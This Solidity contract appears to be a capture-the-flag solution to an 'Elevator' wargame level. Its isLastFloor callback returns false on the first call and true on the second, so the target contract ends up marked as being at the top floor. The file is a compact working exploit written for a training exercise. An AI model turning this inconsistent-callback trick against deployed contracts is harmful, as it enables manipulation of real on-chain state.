// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator{
    function goTo(uint _floor) external;
    function top() external view returns (bool);
}

contract ElevatorAttack{
    Elevator private immutable target;
    uint public count;

    constructor(address _target){
        target=Elevator(_target);
    }

    function attack() public{
        target.goTo(1);
        require(target.top(), "not top");
    }
    function isLastFloor(uint) external returns (bool){
        count++;
        return count>1;
    }

}